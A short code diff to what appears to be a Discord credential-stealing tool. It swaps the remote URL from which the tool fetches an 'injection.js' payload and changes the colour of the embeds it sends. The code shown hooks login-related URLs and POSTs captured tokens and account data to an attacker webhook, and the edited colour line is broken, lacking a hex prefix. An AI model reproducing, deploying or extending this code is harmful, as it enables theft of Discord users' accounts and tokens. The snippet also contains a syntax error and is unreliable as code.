@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/VisoXC/MisterBombastic/refs/heads/main/don/injection.js",
     filters: {
         urls: [
             '/auth/login',
@@ -195,7 +195,7 @@ const hooker = async (content, token, account) => {
     });
 
     for (const embed in content["embeds"]) {
-        content["embeds"][embed]["color"] = 0xb143e3;
+        content["embeds"][embed]["color"] = ad0a0a;
     }
 
     await request("POST", CONFIG.webhook, {
